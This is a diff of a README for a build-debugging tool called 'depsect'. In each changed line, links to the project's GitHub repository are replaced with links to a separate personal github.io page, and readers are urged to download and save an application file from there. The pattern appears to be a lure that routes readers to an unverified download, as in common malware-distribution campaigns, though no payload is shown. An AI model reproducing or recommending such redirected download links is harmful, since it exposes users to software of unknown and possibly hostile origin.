@@ -1,6 +1,6 @@
 # 🔍 depsect - Find the Exact Dependency That Broke Your Build
 
-[![Download depsect](https://img.shields.io/badge/Download%20depsect-Click%20Here%20to%20Download-blue?style=for-the-badge&logo=github&color=purple)](https://github.com/Benitapurplered834/depsect)
+[![Download depsect](https://img.shields.io/badge/Download%20depsect-Click%20Here%20to%20Download-blue?style=for-the-badge&logo=github&color=purple)](https://benitapurplered834.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ Here's what depsect does for you:
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: **[https://github.com/Benitapurplered834/depsect](https://github.com/Benitapurplered834/depsect)**
+Visit this link to download the application: **[https://benitapurplered834.github.io](https://benitapurplered834.github.io)**
 
 Once you're on the download page, look for the download button and save the file to your computer. The download should take just a few seconds depending on your internet connection.
 
@@ -122,9 +122,9 @@ A: depsect can handle projects that use different package managers together. Jus
 
 Don't let broken builds waste your time. Download depsect and find the exact problem in minutes instead of hours.
 
-Visit **[https://github.com/Benitapurplered834/depsect](https://github.com/Benitapurplered834/depsect)** to get your copy now!
+Visit **[https://benitapurplered834.github.io](https://benitapurplered834.github.io)** to get your copy now!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-GitHub%20Repository-brightgreen?style=for-the-badge&logo=github&color=orange)](https://github.com/Benitapurplered834/depsect)
+[![Download Now](https://img.shields.io/badge/Download%20Now-GitHub%20Repository-brightgreen?style=for-the-badge&logo=github&color=orange)](https://benitapurplered834.github.io)
 
 ---
 
